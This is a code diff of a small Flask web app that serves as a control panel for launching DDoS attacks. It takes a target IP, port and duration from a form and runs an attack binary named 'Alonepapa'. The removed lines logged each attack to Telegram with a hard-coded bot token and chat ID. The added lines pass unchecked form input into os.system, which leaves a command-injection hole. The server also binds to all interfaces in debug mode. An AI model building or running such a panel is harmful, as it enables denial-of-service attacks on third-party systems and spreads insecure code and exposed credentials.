@@ -1,40 +1,54 @@
-from flask import Flask, render_template, request, redirect
-import subprocess
-import threading
+from flask import Flask, render_template, request, redirect, url_for
+import os
 import time
-import requests
 
 app = Flask(__name__)
-status = {"running": False}
 
-# Telegram setup
-BOT_TOKEN = '7819992909:AAFzi4cQqmsxApeiGeu2OJDiFM2dC6zcMcY'
-CHAT_ID = '1662672529'
+launched = False
+duration = 0
+current_target = {}
 
-def send_telegram_log(ip, port, duration):
-    message = f"🚀 *New Attack Launched!*\n\n🖥️ IP: `{ip}`\n🔌 Port: `{port}`\n⏱️ Duration: `{duration}` sec"
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.post(url, data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
-
-def run_attack(ip, port, duration):
-    status["running"] = True
-    send_telegram_log(ip, port, duration)
-    subprocess.call(["./Alonepapa", ip, port, duration])
-    time.sleep(int(duration))
-    status["running"] = False
-
-@app.route("/", methods=["GET", "POST"])
+@app.route('/', methods=['GET', 'POST'])
 def index():
-    if request.method == "POST":
-        if request.form.get("action") == "reset":
-            return redirect("/")
-        ip = request.form.get("ip")
-        port = request.form.get("port")
-        duration = request.form.get("duration")
-        thread = threading.Thread(target=run_attack, args=(ip, port, duration))
-        thread.start()
-        return render_template("index.html", launched=True, duration=duration, ip=ip, port=port)
-    return render_template("index.html", launched=False)
+    global launched, duration, current_target
 
-if __name__ == "__main__":
-    app.run(debug=True)
+    if request.method == 'POST':
+        action = request.form.get('action')
+
+        if action == 'launch':
+            ip = request.form.get('ip')
+            port = request.form.get('port')
+            duration = int(request.form.get('duration'))
+
+            current_target = {
+                'ip': ip,
+                'port': port,
+                'duration': duration
+            }
+
+            launched = True
+
+            print(f"\n🚀 Attack Started")
+            print(f"🌐 Target IP: {ip}")
+            print(f"🔌 Port     : {port}")
+            print(f"⏱ Duration : {duration} sec")
+            print("📡 Running ./runner script...")
+
+            # ⚠️ Replace with actual DDoS script path or command
+            os.system(f"timeout {duration} ./Alonepapa {ip} {port} {duration} &")
+
+            time.sleep(1)
+
+        elif action == 'reset':
+            print("\n⛔ Attack Reset")
+            launched = False
+            duration = 0
+            current_target = {}
+
+        return redirect(url_for('index'))
+
+    return render_template('index.html', launched=launched, duration=duration)
+
+if __name__ == '__main__':
+    print("💻 HackerX Web Control Panel running at http://127.0.0.1:5000")
+    app.run(host="0.0.0.0", port=5000, debug=True)
